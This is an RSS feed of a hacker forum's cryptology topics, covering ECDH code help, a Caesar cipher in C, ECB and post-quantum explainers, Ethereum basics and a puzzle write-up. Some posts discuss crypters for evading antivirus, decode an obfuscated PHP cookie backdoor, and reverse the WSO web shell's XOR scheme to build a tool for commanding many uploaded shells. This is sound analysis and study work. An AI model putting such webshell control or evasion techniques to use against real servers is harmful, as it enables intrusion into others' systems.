<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Cryptology - 0x00sec - The Home of the Hacker</title>
    <link>https://0x00sec.org/c/cryptology/57</link>
    <description>Topics in the &#39;Cryptology&#39; category </description>
    
      <lastBuildDate>Fri, 20 Jan 2023 16:25:44 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/c/cryptology/57.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>How to use hard-coded keys for two parties to form key agreement using ECDH from cryptopp library?</title>
          <dc:creator><![CDATA[jonkaka]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Hi folks!.<br>
need help here and don’t say “just google” because i have already done that. I need your help through this code, how it can be corrected to produce correct “Agreed shared secret key” which is supposed to be <code>"1ed885b1064ae5e041cef89365eb7a63b87a6e3e59f6b3ec74c117b74c4e89a4"</code></p>
<p>The code:</p>
<pre><code class="lang-auto">#include &lt;iostream&gt;
using std::cout;
using std::cerr;
using std::endl;

#include &lt;string&gt;
using std::string;

#include &lt;stdexcept&gt;
using std::runtime_error;

#include &lt;cstdlib&gt;
using std::exit;

#include "cryptopp/osrng.h"
using CryptoPP::AutoSeededRandomPool;
using CryptoPP::AutoSeededX917RNG;

#include "cryptopp/aes.h"
using CryptoPP::AES;

#include "cryptopp/eccrypto.h"
using CryptoPP::ECP;
using CryptoPP::ECDH;

#include "cryptopp/secblock.h"
using CryptoPP::SecByteBlock;

#include "cryptopp/oids.h"
using CryptoPP::OID;

// ASN1 is a namespace, not an object
#include "cryptopp/asn.h"
using namespace CryptoPP::ASN1;

#include "cryptopp/integer.h"
using CryptoPP::Integer;

#include &lt;cryptopp/hex.h&gt;

int main( int, char** ) {

    OID CURVE = secp256r1();

    ECDH &lt; ECP &gt;::Domain dhA( CURVE ), dhB( CURVE );
    
    string privatekeyA = "e8586d5fa27ffb6a37817c171c94189ad20d8fcf29fa58ba0e6cbe4cf2bb1079";
    string publickeyB = "4f0609f35a0be01caa1287862680b803ea50fb66af2ad65e990aa4a8944c6191ac0d13d98612e12ba1d9afa86f997aab2827a0cee43bf963e8e995eb95df2fb33";

    SecByteBlock privA(dhA.PrivateKeyLength());
    SecByteBlock pubB(dhB.PublicKeyLength());  
    
    string Prkey, Pukey;
    unsigned char privateky[32];
    unsigned char publicky[64];

    CryptoPP::StringSource ssk(privatekeyA, true ,
        new CryptoPP::HexDecoder(
            new CryptoPP::StringSink(Prkey)
        )
    );

    CryptoPP::StringSource ssv(publickeyB, true ,
        new CryptoPP::HexDecoder(
            new CryptoPP::StringSink(Pukey)
        )
    );

    for(int i=0;i&lt;32;i++) {
		    if (Prkey[i]&lt;0) privateky[i]=Prkey[i]+256;
		    else privateky[i]=Prkey[i];
	    } 

    for(int i=0;i&lt;64;i++) {
		    if (Pukey[i]&lt;0) publicky[i]=Pukey[i]+256;
		    else publicky[i]=Pukey[i];
	    } 
	    
    privA.Assign(privateky, sizeof(privateky));
    pubB.Assign(publicky, sizeof(publicky));

    SecByteBlock sharedA(dhA.AgreedValueLength());

    dhA.Agree(sharedA, privA, pubB);

    Integer a;

    a.Decode(sharedA.BytePtr(), sharedA.SizeInBytes());
    cout &lt;&lt; "Agreed to shared secret: " &lt;&lt; std::hex &lt;&lt; a &lt;&lt; endl;

    return 0;
}
</code></pre>
<p>The output of this code is wrong. Am just playing around to understand the concept so any help even in comments will be highly appreciated.</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-to-use-hard-coded-keys-for-two-parties-to-form-key-agreement-using-ecdh-from-cryptopp-library/33044">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-to-use-hard-coded-keys-for-two-parties-to-form-key-agreement-using-ecdh-from-cryptopp-library/33044</link>
          <pubDate>Fri, 20 Jan 2023 16:25:44 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-33044</guid>
          <source url="https://0x00sec.org/t/how-to-use-hard-coded-keys-for-two-parties-to-form-key-agreement-using-ecdh-from-cryptopp-library/33044.rss">How to use hard-coded keys for two parties to form key agreement using ECDH from cryptopp library?</source>
        </item>
        <item>
          <title>Crypters - Some questions</title>
          <dc:creator><![CDATA[oiashdhf]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Recently, I’ve taken an interest in writing my own crypter… It’s been very hard due to the lack of “good tutorials.” I would ask you to post sources of materials or courses for us to study.</p>
<p>What i notice is that the crypters only work for some time… So my question is, why?<br>
if the contents are encrypted, how antivirus are able to catch them?<br>
My guess is some sort of sandboxing analysis or heuristics that catch them… but since the code is run in memory, can we really evade AVs?</p>
<p>Thanks for any answers. Im kinda new in the malware programming…</p>
            <p><small>9 posts - 9 participants</small></p>
            <p><a href="https://0x00sec.org/t/crypters-some-questions/29335">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/crypters-some-questions/29335</link>
          <pubDate>Sun, 15 May 2022 21:26:05 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-29335</guid>
          <source url="https://0x00sec.org/t/crypters-some-questions/29335.rss">Crypters - Some questions</source>
        </item>
        <item>
          <title>Why is post quantum cryptography important</title>
          <dc:creator><![CDATA[Darkvault]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Quantum  computers will break today’s  asymmetric public-keys cryptography algorithms used for web encryption (https),email encryption (gnupg…),ssh and others.</p>
<p>Quantum computers are designed to use something  called qubits,allowing multiple states being  expressed simultaneously. This allows for breakthrough in certain  types of math problems,solving them nearly  instantaneously. Quantum computers adhere to the law  of physics,and it is only a matter of time before engineer figures out how to build  them properly .</p>
<p>A small 20 qubits quantum computer has already been developed  for the IBM experienced project.</p>
<p>Here  are some software been developed that claims to be  quantum resistant :</p>
<p>●  codecrypt</p>
<p>●  TinySSH(PQC planned)</p>
<p>●  Cyph</p>
<p>● Onetime</p>
<p>This is a thread  to anyone relying on encryption.<br>
There are people out there  saving all  encrypted data and  downloading the encrypted  traffic,waiting for a way to decrypt it.</p>
<p>It is advised to learn the software sooner than later.</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/why-is-post-quantum-cryptography-important/25693">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/why-is-post-quantum-cryptography-important/25693</link>
          <pubDate>Sat, 17 Apr 2021 12:59:38 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-25693</guid>
          <source url="https://0x00sec.org/t/why-is-post-quantum-cryptography-important/25693.rss">Why is post quantum cryptography important</source>
        </item>
        <item>
          <title>Obfuscated PHP Backdoor</title>
          <dc:creator><![CDATA[full]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Hi, I recently found a malicious PHP code [ <a href="https://sharetext.me/8zimbqnzxa" rel="noopener nofollow ugc">LINK</a> ] injected in some webpages, I tried to formate and deobfuscate it and understand how it works, It seems that is using Cookies to execute PHP code (Cookie: cipher=serialized+encrypted PHP code), I just want to know how they are making this kind of backdoors and how to generate this Cookie.</p>
<pre><code>function cs_decrypt_phase($data, $key)
{
    $out_data = "";

    for ($i = 0; $i &lt; strlen($data);) {
        for ($j = 0; $j &lt; strlen($key) &amp;&amp; $i &lt; strlen($data); $j++, $i++) {
            $out_data .= chr(ord($data[$i]) ^ ord($key[$j]));
        }
    }

    return $out_data;
}
</code></pre>
<p>This a readable function to decrypt it.</p>
            <p><small>7 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/obfuscated-php-backdoor/25477">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/obfuscated-php-backdoor/25477</link>
          <pubDate>Fri, 02 Apr 2021 13:41:23 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-25477</guid>
          <source url="https://0x00sec.org/t/obfuscated-php-backdoor/25477.rss">Obfuscated PHP Backdoor</source>
        </item>
        <item>
          <title>Why ECB is not a good mode of operation</title>
          <dc:creator><![CDATA[n33ds0n]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>I have read lot of pdf and online content on symmetry cryptography, 90% of the sources I learned from says that ECB mode is a bad mode of operation due to known-plaintext attack.</p>
<p>My question is, how can an attacker be able to know the plaintext of a cipher text that are the same without the key, although when the same plaintext is encrypted in ECB mode, the cipher text is the same, but how can an attacker be able to know the plaintext of the same cipher text without knowing the key.</p>
<p>it is through guessing or what?</p>
<p>Just wanna know.</p>
            <p><small>5 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/why-ecb-is-not-a-good-mode-of-operation/25443">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/why-ecb-is-not-a-good-mode-of-operation/25443</link>
          <pubDate>Wed, 31 Mar 2021 16:51:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-25443</guid>
          <source url="https://0x00sec.org/t/why-ecb-is-not-a-good-mode-of-operation/25443.rss">Why ECB is not a good mode of operation</source>
        </item>
        <item>
          <title>Caesar Cipher in C [Encryption &amp; Decryption]</title>
          <dc:creator><![CDATA[p0lyx4]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p><strong>What is Caesar Cipher ?</strong></p>
<p>It is one of the simplest encryption technique in which each character in plain text is replaced by a character some fixed number of positions down to it.</p>
<p>For example, if key is 3 then we have to replace character by another character that is 3 position down to it. Like A will be replaced by D, C will be replaced by F and so on.</p>
<p>For decryption just follow the reverse of encryption process.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/0/4/043125d171c63d6224912ccd001e02cd29936cb2.png" alt="image" data-base62-sha1="B5cV5UOSbckQrxb4B6LL0Gt2Uy" width="300" height="132"></p>
<p><strong>Program for Caesar Cipher in C</strong></p>
<p><strong>Encryption</strong></p>
<pre><code>#include&lt;stdio.h&gt;

int main()
{
char message[100], ch;
int i, key;

printf("Enter a message to encrypt: ");
gets(message);
printf("Enter key: ");
scanf("%d", &amp;key);

for(i = 0; message[i] != '\0'; ++i){
	ch = message[i];
	
	if(ch &gt;= 'a' &amp;&amp; ch &lt;= 'z'){
		ch = ch + key;
		
		if(ch &gt; 'z'){
			ch = ch - 'z' + 'a' - 1;
		}
		
		message[i] = ch;
	}
	else if(ch &gt;= 'A' &amp;&amp; ch &lt;= 'Z'){
		ch = ch + key;
		
		if(ch &gt; 'Z'){
			ch = ch - 'Z' + 'A' - 1;
		}
		
		message[i] = ch;
	}
}

printf("Encrypted message: %s", message);

return 0;
}
</code></pre>
<p><strong>Decryption</strong></p>
<pre><code>#include&lt;stdio.h&gt;

int main()
{
char message[100], ch;
int i, key;

printf("Enter a message to decrypt: ");
gets(message);
printf("Enter key: ");
scanf("%d", &amp;key);

for(i = 0; message[i] != '\0'; ++i){
	ch = message[i];
	
	if(ch &gt;= 'a' &amp;&amp; ch &lt;= 'z'){
		ch = ch - key;
		
		if(ch &lt; 'a'){
			ch = ch + 'z' - 'a' + 1;
		}
		
		message[i] = ch;
	}
	else if(ch &gt;= 'A' &amp;&amp; ch &lt;= 'Z'){
		ch = ch - key;
		
		if(ch &lt; 'A'){
			ch = ch + 'Z' - 'A' + 1;
		}
		
		message[i] = ch;
	}
}

printf("Decrypted message: %s", message);

return 0;
}</code></pre>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/caesar-cipher-in-c-encryption-decryption/23522">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/caesar-cipher-in-c-encryption-decryption/23522</link>
          <pubDate>Tue, 13 Oct 2020 13:02:12 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-23522</guid>
          <source url="https://0x00sec.org/t/caesar-cipher-in-c-encryption-decryption/23522.rss">Caesar Cipher in C [Encryption &amp; Decryption]</source>
        </item>
        <item>
          <title>[WSO SHELL] XOR encrypt and decrypt</title>
          <dc:creator><![CDATA[DamaneDz]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Hello guys,</p>
<p>A friend of me sent <a href="https://pastebin.com/RbVzimQz" rel="noopener nofollow ugc">this</a>  and asked me to make it compatible</p>
<p>with the latest version of <a href="https://github.com/tennc/webshell/tree/master/php/wso" rel="noopener nofollow ugc">wso shell</a> the 4v and above.</p>
<p>After downloading the wso file, we have these first lines that show us everything happen when</p>
<p>there is a POST Request:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1a80e2e9c9d9f7d515ebaf25879eab3d9a2d3634.png" alt="Screenshot_4" data-base62-sha1="3MsydZtkyllorAn0wN2BLIRzTmc" width="690" height="221"></p>
<p>We notice something weird ! a decrypt() function in each REQUEST</p>
<p>Let’s see what we have</p>
<pre><code>function decrypt($str,$pwd){
	$pwd=base64_encode($pwd);
	$str=base64_decode($str);
	$enc_chr="";
	$enc_str="";
	$i=0;
	while($i&lt;strlen($str)){
	for($j=0;$j&lt;strlen($pwd);$j++){
	$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));
	$enc_str.=$enc_chr;
	$i++;
	if($i&gt;=strlen($str))break;
	}
	}
return base64_decode($enc_str);
}
</code></pre>
<p>It’s looks like an XOR encryption what I can quote from someone is :</p>
<blockquote>
<p>XOR is symmetric, we use the same method to encrypt and decrypt.</p>
</blockquote>
<p>I’ll put the wso shell in my localhost and open burpsuite so I’ll understand more how stuff works .</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/42387a111500377d1d5e70e409e8081f4e9ac0ad.png" alt="Screenshot_5" data-base62-sha1="9rOvS8TtepS67ARnmuGca4eSGZf" width="659" height="315"></p>
<p>We have an encrypted values for some requests let’s take the a value</p>
<p><code>GBMlAA==</code></p>
<p>Using the decrypt function we’ll get</p>
<p><code>Php</code></p>
<p>Everything is okay for now, and by googling the function I found something in <a href="https://www.reddit.com/r/Malware/comments/8hiaz6/encoded_malware_what_encoding/" rel="noopener nofollow ugc">REDDIT</a></p>
<p>The only discussion about it in the whole internet.</p>
<p>So how to go from</p>
<p><code>Php</code> To <code>GBMlAA==</code></p>
<p>The key in our function is called pwd and we get the value of pwd from this:</p>
<blockquote>
<p>$_COOKIE[md5($_SERVER[‘HTTP_HOST’]).“key”]</p>
</blockquote>
<p>Means:</p>
<p><code>$▙ = md5($_SERVER['HTTP_USER_AGENT']);</code></p>
<p>So for the encoding function will always base64 encode the “pwd” value</p>
<p>My Final PHP script can run a specified command in many uploaded shells</p>
<p>Before the gist link</p>
<blockquote>
<p>This Script used for authorized testing and/or educational purposes only.<br>
Run it on your own localhost or your server.<br>
I take no responsibility for the abuse of the script.</p>
</blockquote>
<aside class="onebox githubgist">
  <header class="source">
      <a href="https://gist.github.com/DamaneDz/f41ef7c340daa8d47ca54b7ce4d1e3f8" target="_blank" rel="noopener nofollow ugc">gist.github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://gist.github.com/DamaneDz/f41ef7c340daa8d47ca54b7ce4d1e3f8" target="_blank" rel="noopener nofollow ugc">https://gist.github.com/DamaneDz/f41ef7c340daa8d47ca54b7ce4d1e3f8</a></h4>
<h5>wso_cmd.php</h5>
<pre><code class="PHP">&lt;?php
/*

 Mass COMMAND EXCUTER For WSO Shell 4.*.*
 Modified and Made on 26/06/2019 By DamaneDz
 
 This Script used for authorized testing and/or educational purposes only.
 Run it on your own localhost or your server.
 I take no responsibility for the abuse of the script.
 </code></pre>
This file has been truncated. <a href="https://gist.github.com/DamaneDz/f41ef7c340daa8d47ca54b7ce4d1e3f8" target="_blank" rel="noopener nofollow ugc">show original</a>

<p>
</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/wso-shell-xor-encrypt-and-decrypt/14720">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/wso-shell-xor-encrypt-and-decrypt/14720</link>
          <pubDate>Wed, 03 Jul 2019 14:14:58 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-14720</guid>
          <source url="https://0x00sec.org/t/wso-shell-xor-encrypt-and-decrypt/14720.rss">[WSO SHELL] XOR encrypt and decrypt</source>
        </item>
        <item>
          <title>Ethereum and Smart Contracts (Part 1)</title>
          <dc:creator><![CDATA[occupi]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <h2>Introduction</h2>
<p>In this article we’ll be discussion the Ethereum blockchain and the technology of “Smart Contracts” that exist within that blockchain ecosystem. If you’re brand new to Ethereum, the “Ether” cryptoasset and Smart Contracts, I recommend reading the <a href="https://www.ethereum.org/ether" rel="noopener nofollow ugc">Ethereum Foundation’s FAQ</a>.</p>
<p>For further reading:</p>
<ul>
<li><a href="https://blockgeeks.com/guides/what-is-blockchain-technology/" rel="noopener nofollow ugc">https://blockgeeks.com/guides/what-is-blockchain-technology/</a></li>
<li><a href="https://coinsutra.com/ethereum-beginners-guide/#Bitcoin_vsEthereum" rel="noopener nofollow ugc">https://coinsutra.com/ethereum-beginners-guide/#Bitcoin_vsEthereum</a></li>
<li><a href="https://www.mayowatudonu.com/blockchain/deep-dive-into-evm-intro" rel="noopener nofollow ugc">https://www.mayowatudonu.com/blockchain/deep-dive-into-evm-intro</a></li>
<li><a href="https://medium.com/ethereum-developers/the-ultimate-end-to-end-tutorial-to-create-and-deploy-a-fully-descentralized-dapp-in-ethereum-18f0cf6d7e0e" rel="noopener nofollow ugc">https://medium.com/ethereum-developers/the-ultimate-end-to-end-tutorial-to-create-and-deploy-a-fully-descentralized-dapp-in-ethereum-18f0cf6d7e0e</a></li>
<li><a href="https://www.investopedia.com/terms/e/ether-cryptocurrency.asp" rel="noopener nofollow ugc">https://www.investopedia.com/terms/e/ether-cryptocurrency.asp</a></li>
<li><a href="https://kb.myetherwallet.com/gas/what-is-gas-ethereum.html" rel="noopener nofollow ugc">https://kb.myetherwallet.com/gas/what-is-gas-ethereum.html</a></li>
</ul>
<h2>What is Ethereum?</h2>
<p>Ethereum is a “turing-complete” open-source, distributed, p2p blockchain technology using modified <a href="https://blockonomi.com/nakamoto-consensus/" rel="noopener nofollow ugc">Nakamoto consensus</a>. It’s essentially a simplified virtual computer, running across thousands of individual nodes who all agree on what the output should be. Anyone running an Ethereum node (a piece of software that communicates with the rest of the Ethereum network) is part of this global virtual computer. <a href="https://www.coindesk.com/information/ethereum-mining-works" rel="noopener nofollow ugc">Ethereum mining</a> in concept is much like Bitcoin, securing the network and confirming blocks. There is a cryptoasset integrated directly into Ethereum called Ether. Miniscule amounts of Ether (referred to as Gas) are used to pay for transactions on the blockchain. With a maximum Gas limit per transaction (and the potential for you to run out of Gas, literally), this ensures that only the “necessary” transactions will continue to be computed on the chain. I use the term “necessary” here in the sense that someone or something is still paying for these transactions to be executed.</p>
<h3>What does it look like to me?</h3>
<p>An Ethereum wallet address is of the format <code>0x999999cf1046e68e36E1aA2E0E07105eDDD1f08E</code></p>
<p>As an end user you’d probably use a wallet application to keep track of your Ether as well as any other <a href="https://theethereum.wiki/w/index.php/ERC20_Token_Standard" rel="noopener nofollow ugc">ERC20 assets</a> you’ve collected.</p>
<ul>
<li>
<a href="https://metamask.io/" rel="noopener nofollow ugc">MetaMask</a>, the best Ethereum browser plugin (in my opinion)</li>
<li>
<a href="https://www.myetherwallet.com/" rel="noopener nofollow ugc">MyEtherWallet</a> is an online wallet for the Ethereum blockchain</li>
<li>
<a href="https://www.exodus.io/" rel="noopener nofollow ugc">Exodus</a> is a multi-functional wallet that supports lots of cryptoassets, including Ether</li>
</ul>
<p>You may also <a href="https://ethereum.gitbooks.io/frontier-guide/content/getting_a_client.html" rel="noopener nofollow ugc">run a full node</a> which manages its own copy of the Ethereum blockchain (80Gb+ with full sync). Often it’s a GUI-less daemon that you communicate with via RPC, much like the bitcoin daemon.</p>
<p>You can <a href="https://etherscan.io/" rel="noopener nofollow ugc">browse the Ethereum blockchain via EtherScan</a> or other blockchain explorers.</p>
<h2>What is Ether?</h2>
<p>Ether is the name of the cryptoasset integrated directly into the Ethereum blockchain. It is both a cryptocurrency and – since it’s also used in tiny amounts as fuel for transactions on the chain –  a “cryptoresource”. Ether is traded on pretty much every big cryptoexchange market and several startups have their entire bankrolls invested in this stuff. As of the time of writing Ether is <a href="https://ethereumprice.org/live/" rel="noopener nofollow ugc">trading at around $116 USD/1 ETH</a>.</p>
<h3>What does it look like to me?</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f7de48401327342b70dd9e6059d5a1001ae1433a.png" alt="image" data-base62-sha1="zmKaHLR6Ugbe6nNwjR6znVQtSoq" width="397" height="188"><br>
Some Ether. Also yes, those are CryptoKitties.</p>
<p>Or from a code perspective, it might look like this (simplified):</p>
<pre><code class="lang-auto">contract FakeEther {
    address minter;
    mapping (address =&gt; uint) balances;
    function FakeEther() {
        minter = msg.sender;
    }
    function mint(address owner, uint amount) {
        if (msg.sender != minter) return;
        balances[owner] += amount;
    }
    function send(address receiver, uint amount) {
        if (balances[msg.sender] &lt; amount) return;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
    }
    function queryBalance(address addr) constant returns (uint balance) {
        return balances[addr];
    }
}
</code></pre>
<p>The above Solidity code is a very simplified smart contract that allows one to mint a currency conveniently called FakeEther. You can mint some FakeEther, send it to other valid addresses, and check your FakeEther balance! Look at us, we just established a decentralized currency that can withstand even the most oppressive regime as long as they don’t cut off electricity or internet access!</p>
<h2>What is Gas?</h2>
<p><a href="http://ethdocs.org/en/latest/ether.html#gas-and-ether" rel="noopener nofollow ugc">Gas is the tiny amount of Ether</a> used to pay for transactions computed on the Ethereum blockchain. Gas is technically not another currency but simply a way to refer to the miniscule amounts of Ether used in these processes. Gas is measured in <a href="http://ethdocs.org/en/latest/ether.html#denominations" rel="noopener nofollow ugc">Wei, the smallest unit of Ether</a>. When sending a transaction on the Ethereum blockchain, you can set the maximum amount of Gas you’re willing to spend on getting that transaction processed. Most clients will calculate a rough estimate for you, and the unused amount gets returned to your wallet. The reliance on Gas to send transactions means that smart contracts need a small supply of Ether in order to “live” on the blockchain, or their transactions will automatically fail.</p>
<ul>
<li><a href="https://ethgasstation.info/" rel="noopener nofollow ugc">Check the average Gas price of transactions</a></li>
<li><a href="https://media.consensys.net/a-guide-to-gas-12b40d03605d" rel="noopener nofollow ugc">A guide to Gas and why it’s necessary</a></li>
</ul>
<h3>What does it look like to me?</h3>
<p>Gas is a mostly behind-the-scenes thing but can rear its ugly head when you’re trying to play around with smart contracts. Specifying Gas Limits, knowing Gas Prices, these are all things you’ll become intimately familiar with as we venture further into the world of Smart Contracts.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1dda907954248d698dd6725202981a1def21c99b.png" alt="image" data-base62-sha1="4g67lV9xPy6FtgeRy09yR56L3x9" width="360" height="500"><br>
MetaMask complaining about a lack of funds, Gas is still just Ether.</p>
<h2>What is a Smart Contract?</h2>
<p>A Smart Contract on the Ethereum blockchain is simply compiled bytecode that’s been inserted into the blockchain at an address. It operates as a program, with inputs and outputs, and you interact with it via Ethereum transactions.</p>
<p>Normally when transacting on Ethereum, you’d probably send some Ether from your wallet to Bill’s wallet. With Smart Contracts, Bill’s wallet might actually be a contract address that runs some code when it receives Ether. Maybe it pays Bill directly, maybe it sends money to his ex-wife first. By pasting the address into EtherScan and examining it further, one could see immediately that Bill’s using a contract to receive his Ether.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6c1d7b7e295c15441de401483c30e61f23a5f2b7.png" alt="image" data-base62-sha1="fqqJpUd1BICMa5kRaqu2EKa5hYP" width="690" height="413"></p>
<p>Notice that it says “Contract” right in the <em>To:</em> field, this is because EtherScan knows immediately that this is a contract address. Aside from this it still functions like a normal Ethereum wallet. It can hold Ether and pay Gas prices.</p>
<h3>What does it look like to me?</h3>
<p>Smart Contract developers today <a href="https://solidity.readthedocs.io/en/latest/" rel="noopener nofollow ugc">write in Solidity</a>. It’s a statically-typed language designed for developing smart contracts on the Ethereum blockchain. As stated above, it compiles to bytecode that lives on the blockchain itself. It supports inheritance, structs, and some other pleasures of modern languages.</p>
<p>Example:</p>
<pre><code class="lang-auto">pragma solidity &gt;=0.4.22 &lt;0.6.0;

contract Mortal {
    /* Define variable owner of the type address */
    address owner;

    /* This constructor is executed at initialization and sets the owner of the contract */
    constructor() public { owner = msg.sender; }

    /* Function to recover the funds on the contract */
    function kill() public { if (msg.sender == owner) selfdestruct(msg.sender); }
}

contract Greeter is Mortal {
    /* Define variable greeting of the type string */
    string greeting;

    /* This runs when the contract is executed */
    constructor(string memory _greeting) public {
        greeting = _greeting;
    }

    /* Main function */
    function greet() public view returns (string memory) {
        return greeting;
    }
}
</code></pre>
<p>Thanks to <a href="https://remix.ethereum.org" rel="noopener nofollow ugc">ReMix</a>, we’re able to <a href="https://remix.readthedocs.io/en/latest/" rel="noopener nofollow ugc">compile our Solidity smart contracts right on the web</a>. We can deploy them directly into the Ethereum ecosystem using a combination of ReMix and the <a href="https://metamask.io/" rel="noopener nofollow ugc">MetaMask browser plugin</a>.</p>
<p>The Ethereum Foundation has some great tutorials on writing your first smart contracts, I highly recommend checking those out before we venture into too far into the realm of smart contract security.</p>
<ul>
<li><a href="https://www.ethereum.org/greeter" rel="noopener nofollow ugc">Create a Digital Greeter</a></li>
<li><a href="https://www.ethereum.org/token" rel="noopener nofollow ugc">Issue your first token/currency</a></li>
<li><a href="https://www.ethereum.org/crowdsale" rel="noopener nofollow ugc">Crowdfund a project using a smart contract</a></li>
<li><a href="https://www.ethereum.org/dao" rel="noopener nofollow ugc">Create a new Decentralized Autonomous Organization</a></li>
</ul>
<p>And these are just the beginning!</p>
<h2>Conclusion</h2>
<p>The light side of smart contracts is all these wonderful tools for creating decentralized communities, currencies, projects. The dark side is a lot of immutable ponzi and pyramid schemes. Guess which we’ll be looking at in part 2? Stay tuned.</p>
<p>This article is a work in progress. Please feel free to reply with corrections and I’ll edit as necessary. I appreciate all feedback!</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/ethereum-and-smart-contracts-part-1/9931">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/ethereum-and-smart-contracts-part-1/9931</link>
          <pubDate>Sun, 02 Dec 2018 19:49:07 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-9931</guid>
          <source url="https://0x00sec.org/t/ethereum-and-smart-contracts-part-1/9931.rss">Ethereum and Smart Contracts (Part 1)</source>
        </item>
        <item>
          <title>[ARG] The Red Triangle Solving -- Part2</title>
          <dc:creator><![CDATA[404Err0r]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Hello folks, today I’m going to continue <strong>The Red Triangle</strong> series.<br>
If you haven’t seen the first one yet, you can check it here:  <a href="https://0x00sec.org/t/arg-the-red-triangle-solving-part-1/7272">[ARG] The Red Triangle Solving — Part 1</a></p>
<p>Last time, we have deciphered the Monoalphabetic Substitution symbols from the images and got a link to google drive, that lead us to the next link of the puzzle.<br>
Now that we are all set, let’s jump into it !</p>
<h1>Getting started</h1>
<p>Once you open the link, you are prompted with the same symbolic red triangle ,as in the previous one, and underneath you have an interesting image.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/056f97291ec61c45b55538ace6043f0f7795efae.png" alt="image2" data-base62-sha1="M5t4ciTxaai2XFtQvzW6drXUFE" width="690" height="350"><br>
Also, on the background is playing an audio file, but this time, you can hear something strange at the beginning. We will get into that later.</p>
<p>I have viewed the source code and found this:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/0/0e5ad59888d74c8efe468ac95f6f03cc5d766e95.png" alt="source" data-base62-sha1="22ZimZ97kEM46mg3xeVvhN3cX53" width="469" height="339"><br>
<strong>Note:</strong> <em><em>apparently Coeus’s was a Titan in the Greek mythology and represented rational intelligence.</em></em></p>
<p>Besides that, I found nothing, so I went on and downloaded the image and the audio file.</p>
<h1>The Image</h1>
<p>At first glance, I thought that was something hidden in it ,as I thought on the previous one, and started to fire some tools on it, but found nothing… So, I thought maybe it has something to do with the meaning of the structure because I saw a pattern in the image.<br>
I have started researching this kind of pattern and it’s actually the Fibonacci sequence.<br>
Besides that, I found nothing.<br>
<em>( If you guys want to have a look at it, contact me and maybe we could find something. I still think it’s a message or some sort of thing in it. )</em></p>
<h1>The Audio File</h1>
